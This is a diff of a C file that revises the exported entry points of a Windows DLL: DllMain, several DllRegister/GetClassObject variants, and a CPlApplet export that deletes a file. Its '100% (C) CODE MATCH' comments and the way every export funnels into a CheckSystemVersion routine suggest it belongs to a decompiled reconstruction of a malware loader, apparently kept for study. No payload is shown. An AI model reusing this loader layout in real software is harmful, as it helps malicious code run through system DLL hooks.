@@ -1,5 +1,5 @@
 /******************************************************************************************
-  Copyright 2012-2013 Christian Roggia
+  Copyright (C) 2012-2014 Christian Roggia <christian.roggia@gmail.com>
 
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
@@ -14,52 +14,70 @@
    limitations under the License.
 ******************************************************************************************/
 
-#include "data.h"
 #include "3. OS.h"
+#include "config.h"
+#include "StdAfx.h"
+
+HINSTANCE g_hInstDLL = NULL;
 
 // 100% (C) CODE MATCH
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
-	if(fdwReason && fdwReason == 1) hINSTANCE = hinstDLL;
+	DEBUG_P("DllMain called")
+	
+	if(fdwReason && fdwReason == 1)
+		g_hInstDLL = hinstDLL;
+	
 	return TRUE;
 }
 
 // 100% (C) CODE MATCH
-BOOL __stdcall DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+BOOL WINAPI DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
+	DEBUG_P("DllUnregisterServerEx called")
+	
 	if(fdwReason && fdwReason == 1)
 	{
-		hINSTANCE = hinstDLL;
+		g_hInstDLL = hinstDLL;
 		CheckSystemVersion(TRUE);
 	}
 	
-	return 0;
+	return FALSE;
 }
 
 // 100% (C) CODE MATCH
-HRESULT __stdcall DllCanUnloadNow(void)
+STDAPI APIENTRY DllCanUnloadNow(void)
 {
-	hINSTANCE = GetModuleHandleW(0);
+	DEBUG_P("DllCanUnloadNow called")
+	
+	g_hInstDLL = GetModuleHandleW(0);
 	CheckSystemVersion(TRUE);
+	
 	ExitProcess(0);
 }
 
 // 100% (C) CODE MATCH
-HRESULT __stdcall DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
+STDAPI APIENTRY DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
 {
+	DEBUG_P("DllGetClassObject called")
+	
 	CheckSystemVersion(TRUE);
 }
 
 // 100% (C) CODE MATCH
-HRESULT __stdcall DllRegisterServerEx(void)
+STDAPI APIENTRY DllRegisterServerEx(void)
 {
+	DEBUG_P("DllRegisterServerEx called")
+	
 	CheckSystemVersion(TRUE);
 	return 1;
 }
 
 // 100% (C) CODE MATCH
-LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
+LONG WINAPI CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
 {
+	DEBUG_P("CPlApplet called")
+	
 	if(*(DWORD *)(hwndCPl + 2))
 		DeleteFileA(*(LPCSTR *)(hwndCPl + 2));
 	
@@ -70,5 +88,7 @@ LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
 // 100% (C) CODE MATCH
 STDAPI APIENTRY DllGetClassObjectEx(int a1, int a2, int a3, int a4)
 {
+	DEBUG_P("DllGetClassObjectEx called")
+	
 	CheckSystemVersion(FALSE);
 }
